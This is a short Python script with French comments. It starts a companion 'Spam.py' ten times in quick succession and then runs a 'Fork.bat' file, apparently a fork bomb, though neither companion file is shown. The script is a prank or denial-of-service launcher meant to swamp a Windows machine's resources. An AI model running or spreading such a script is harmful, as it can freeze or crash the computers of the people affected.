#-*- coding: utf-8 -*-

# Imports
import subprocess, sys, os, getpass, time

# Nom de l'utilisateur actuel
username = getpass.getuser()

# Fichiers

# Directory
# Dossier Solar
pathFile = os.path.dirname(os.path.abspath(__file__))

# File
# Fork.bat
pathSpam = (pathFile + '\\Spam.py')
# Fork.bat
pathFork = (pathFile + '\\Fork.bat')

# Main
def start_spam ():

    subprocess.Popen([sys.executable, pathSpam])

for i in range(10):
    time.sleep(0.6)
    start_spam()

subprocess.call(pathFork)
